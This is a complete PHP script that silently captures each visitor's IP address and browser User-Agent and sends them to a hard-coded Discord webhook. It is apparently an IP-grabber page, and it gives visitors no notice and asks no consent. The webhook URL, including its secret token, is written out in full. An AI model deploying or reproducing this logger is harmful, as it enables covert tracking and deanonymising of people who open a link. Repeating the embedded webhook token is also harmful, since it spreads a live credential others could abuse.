<?php

$url = "https://discord.com/api/webhooks/1116840690811412623/ljBC7BcAaKj4orxzDFcJvID4CSF5Q7Sir3678YqqrAl-I9w3EtXW7cbTpScp7144Elxr";

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$data = array(
    'content' => "IP address: $ip\nUser agent: $user_agent"
);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ),
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === false) {
    echo "Error sending message to Discord webhook";
} else {
    echo "Message sent to Discord webhook";
}
